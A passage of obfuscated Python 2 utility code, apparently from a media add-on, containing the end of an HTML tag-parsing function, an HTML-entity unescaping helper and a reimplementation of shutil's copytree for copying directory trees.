        except :#line:2901
            O000O0OO0O000O000 =[O000O0OO0O000O000 ]#line:2902
    elif isinstance (O000O0OO0O000O000 ,unicode ):#line:2903
        O000O0OO0O000O000 =[O000O0OO0O000O000 ]#line:2904
    elif not isinstance (O000O0OO0O000O000 ,list ):#line:2905
        return u""#line:2906
    if not name .strip ():#line:2908
        return u""#line:2909
    OOOO00OO000O0O000 =[]#line:2911
    for O00000O0OO000OO0O in O000O0OO0O000O000 :#line:2912
        OO0OOO00OOO00O000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00000O0OO000OO0O )#line:2913
        for OOO0OO000OO0OO0OO in OO0OOO00OOO00O000 :#line:2914
            O00000O0OO000OO0O =O00000O0OO000OO0O .replace (OOO0OO000OO0OO0OO ,OOO0OO000OO0OO0OO .replace ("\n"," "))#line:2915
        O00OO0O000O00O0OO =[]#line:2917
        for O0O0000OOOO000O00 in attrs :#line:2918
            O0OO00O00OO000O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0000OOOO000O00 +'=[\'"]'+attrs [O0O0000OOOO000O00 ]+'[\'"].*?>))',re .M |re .S ).findall (O00000O0OO000OO0O )#line:2919
            if len (O0OO00O00OO000O00 )==0 and attrs [O0O0000OOOO000O00 ].find (" ")==-1 :#line:2920
                O0OO00O00OO000O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0O0000OOOO000O00 +'='+attrs [O0O0000OOOO000O00 ]+'.*?>))',re .M |re .S ).findall (O00000O0OO000OO0O )#line:2921
            if len (O00OO0O000O00O0OO )==0 :#line:2923
                O00OO0O000O00O0OO =O0OO00O00OO000O00 #line:2924
                O0OO00O00OO000O00 =[]#line:2925
            else :#line:2926
                O0OOOOOOOOO000000 =range (len (O00OO0O000O00O0OO ))#line:2927
                O0OOOOOOOOO000000 .reverse ()#line:2928
                for OOOOO0O00O0O00OOO in O0OOOOOOOOO000000 :#line:2929
                    if not O00OO0O000O00O0OO [OOOOO0O00O0O00OOO ]in O0OO00O00OO000O00 :#line:2930
                        del (O00OO0O000O00O0OO [OOOOO0O00O0O00OOO ])#line:2931
        if len (O00OO0O000O00O0OO )==0 and attrs =={}:#line:2933
            O00OO0O000O00O0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00000O0OO000OO0O )#line:2934
            if len (O00OO0O000O00O0OO )==0 :#line:2935
                O00OO0O000O00O0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00000O0OO000OO0O )#line:2936
        if isinstance (ret ,str ):#line:2938
            O0OO00O00OO000O00 =[]#line:2939
            for OOO0OO000OO0OO0OO in O00OO0O000O00O0OO :#line:2940
                O0O0OO0O00OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO0OO000OO0OO0OO )#line:2941
                if len (O0O0OO0O00OO00OO0 )==0 :#line:2942
                    O0O0OO0O00OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO0OO000OO0OO0OO )#line:2943
                for OO0000O000OO00OOO in O0O0OO0O00OO00OO0 :#line:2944
                    O0OOOOOOOOO0OO000 =OO0000O000OO00OOO [0 ]#line:2945
                    if O0OOOOOOOOO0OO000 in "'\"":#line:2946
                        if OO0000O000OO00OOO .find ('='+O0OOOOOOOOO0OO000 ,OO0000O000OO00OOO .find (O0OOOOOOOOO0OO000 ,1 ))>-1 :#line:2947
                            OO0000O000OO00OOO =OO0000O000OO00OOO [:OO0000O000OO00OOO .find ('='+O0OOOOOOOOO0OO000 ,OO0000O000OO00OOO .find (O0OOOOOOOOO0OO000 ,1 ))]#line:2948
                        if OO0000O000OO00OOO .rfind (O0OOOOOOOOO0OO000 ,1 )>-1 :#line:2950
                            OO0000O000OO00OOO =OO0000O000OO00OOO [1 :OO0000O000OO00OOO .rfind (O0OOOOOOOOO0OO000 )]#line:2951
                    else :#line:2952
                        if OO0000O000OO00OOO .find (" ")>0 :#line:2953
                            OO0000O000OO00OOO =OO0000O000OO00OOO [:OO0000O000OO00OOO .find (" ")]#line:2954
                        elif OO0000O000OO00OOO .find ("/")>0 :#line:2955
                            OO0000O000OO00OOO =OO0000O000OO00OOO [:OO0000O000OO00OOO .find ("/")]#line:2956
                        elif OO0000O000OO00OOO .find (">")>0 :#line:2957
                            OO0000O000OO00OOO =OO0000O000OO00OOO [:OO0000O000OO00OOO .find (">")]#line:2958
                    O0OO00O00OO000O00 .append (OO0000O000OO00OOO .strip ())#line:2960
            O00OO0O000O00O0OO =O0OO00O00OO000O00 #line:2961
        else :#line:2962
            O0OO00O00OO000O00 =[]#line:2963
            for OOO0OO000OO0OO0OO in O00OO0O000O00O0OO :#line:2964
                OOO0000O00O0OOO00 =u"</"+name #line:2965
                O0OOOOO0000O0O0O0 =O00000O0OO000OO0O .find (OOO0OO000OO0OO0OO )#line:2967
                OOO0O0O0O00O00OO0 =O00000O0OO000OO0O .find (OOO0000O00O0OOO00 ,O0OOOOO0000O0O0O0 )#line:2968
                O000000O0OOOO0O0O =O00000O0OO000OO0O .find ("<"+name ,O0OOOOO0000O0O0O0 +1 )#line:2969
                while O000000O0OOOO0O0O <OOO0O0O0O00O00OO0 and O000000O0OOOO0O0O !=-1 :#line:2971
                    OOOOO00O000O00O00 =O00000O0OO000OO0O .find (OOO0000O00O0OOO00 ,OOO0O0O0O00O00OO0 +len (OOO0000O00O0OOO00 ))#line:2972
                    if OOOOO00O000O00O00 !=-1 :#line:2973
                        OOO0O0O0O00O00OO0 =OOOOO00O000O00O00 #line:2974
                    O000000O0OOOO0O0O =O00000O0OO000OO0O .find ("<"+name ,O000000O0OOOO0O0O +1 )#line:2975
                if O0OOOOO0000O0O0O0 ==-1 and OOO0O0O0O00O00OO0 ==-1 :#line:2977
                    OOO000O0OOOO0OO00 =u""#line:2978
                elif O0OOOOO0000O0O0O0 >-1 and OOO0O0O0O00O00OO0 >-1 :#line:2979
                    OOO000O0OOOO0OO00 =O00000O0OO000OO0O [O0OOOOO0000O0O0O0 +len (OOO0OO000OO0OO0OO ):OOO0O0O0O00O00OO0 ]#line:2980
                elif OOO0O0O0O00O00OO0 >-1 :#line:2981
                    OOO000O0OOOO0OO00 =O00000O0OO000OO0O [:OOO0O0O0O00O00OO0 ]#line:2982
                elif O0OOOOO0000O0O0O0 >-1 :#line:2983
                    OOO000O0OOOO0OO00 =O00000O0OO000OO0O [O0OOOOO0000O0O0O0 +len (OOO0OO000OO0OO0OO ):]#line:2984
                if ret :#line:2986
                    OOO0000O00O0OOO00 =O00000O0OO000OO0O [OOO0O0O0O00O00OO0 :O00000O0OO000OO0O .find (">",O00000O0OO000OO0O .find (OOO0000O00O0OOO00 ))+1 ]#line:2987
                    OOO000O0OOOO0OO00 =OOO0OO000OO0OO0OO +OOO000O0OOOO0OO00 +OOO0000O00O0OOO00 #line:2988
                O00000O0OO000OO0O =O00000O0OO000OO0O [O00000O0OO000OO0O .find (OOO000O0OOOO0OO00 ,O00000O0OO000OO0O .find (OOO0OO000OO0OO0OO ))+len (OOO000O0OOOO0OO00 ):]#line:2990
                O0OO00O00OO000O00 .append (OOO000O0OOOO0OO00 )#line:2991
            O00OO0O000O00O0OO =O0OO00O00OO000O00 #line:2992
        OOOO00OO000O0O000 +=O00OO0O000O00O0OO #line:2993
    return OOOO00OO000O0O000 #line:2995
def replaceHTMLCodes (O00O00OOO0000000O ):#line:2998
    O00O00OOO0000000O =re .sub ("(&#[0-9]+)([^;^0-9]+)","\\1;\\2",O00O00OOO0000000O )#line:2999
    O00O00OOO0000000O =HTMLParser .HTMLParser ().unescape (O00O00OOO0000000O )#line:3000
    O00O00OOO0000000O =O00O00OOO0000000O .replace ("&quot;","\"")#line:3001
    O00O00OOO0000000O =O00O00OOO0000000O .replace ("&amp;","&")#line:3002
    return O00O00OOO0000000O #line:3003
import os #line:3005
from shutil import *#line:3006
def copytree (OOOOO0OO0000O000O ,OO0O00000OOOOOO00 ,symlinks =False ,ignore =None ):#line:3007
	O00OOO00000O0O000 =os .listdir (OOOOO0OO0000O000O )#line:3008
	if ignore is not None :#line:3009
		OO0O00O0OOO0OOO00 =ignore (OOOOO0OO0000O000O ,O00OOO00000O0O000 )#line:3010
	else :#line:3011
		OO0O00O0OOO0OOO00 =set ()#line:3012
	if not os .path .isdir (OO0O00000OOOOOO00 ):#line:3013
		os .makedirs (OO0O00000OOOOOO00 )#line:3014
	O00OO0O0OO0000OOO =[]#line:3015
	for OO0OOOOO0OO00O00O in O00OOO00000O0O000 :#line:3016
		if OO0OOOOO0OO00O00O in OO0O00O0OOO0OOO00 :#line:3017
			continue #line:3018
		OOO0OOO000OOO0OO0 =os .path .join (OOOOO0OO0000O000O ,OO0OOOOO0OO00O00O )#line:3019
		O00O00OO00000OOOO =os .path .join (OO0O00000OOOOOO00 ,OO0OOOOO0OO00O00O )#line:3020
		try :#line:3021
			if symlinks and os .path .islink (OOO0OOO000OOO0OO0 ):#line:3022
				O00000O00O0OOO00O =os .readlink (OOO0OOO000OOO0OO0 )#line:3023
				os .symlink (O00000O00O0OOO00O ,O00O00OO00000OOOO )#line:3024
			elif os .path .isdir (OOO0OOO000OOO0OO0 ):#line:3025
				copytree (OOO0OOO000OOO0OO0 ,O00O00OO00000OOOO ,symlinks ,ignore )#line:3026
			else :#line:3027
				copy2 (OOO0OOO000OOO0OO0 ,O00O00OO00000OOOO )#line:3028
		except Error as OOO00OO0OO0O000O0 :#line:3029
			O00OO0O0OO0000OOO .extend (OOO00OO0OO0O000O0 .args [0 ])#line:3030
		except EnvironmentError as O0OOO0OOO00OO000O :#line:3031
			O00OO0O0OO0000OOO .append ((OOO0OOO000OOO0OO0 ,O00O00OO00000OOOO ,str (O0OOO0OOO00OO000O )))#line:3032
	try :#line:3033
		copystat (OOOOO0OO0000O000O ,OO0O00000OOOOOO00 )#line:3034
	except OSError as O0OOO0OOO00OO000O :#line:3035
		O00OO0O0OO0000OOO .extend ((OOOOO0OO0000O000O ,OO0O00000OOOOOO00 ,str (O0OOO0OOO00OO000O )))#line:3036
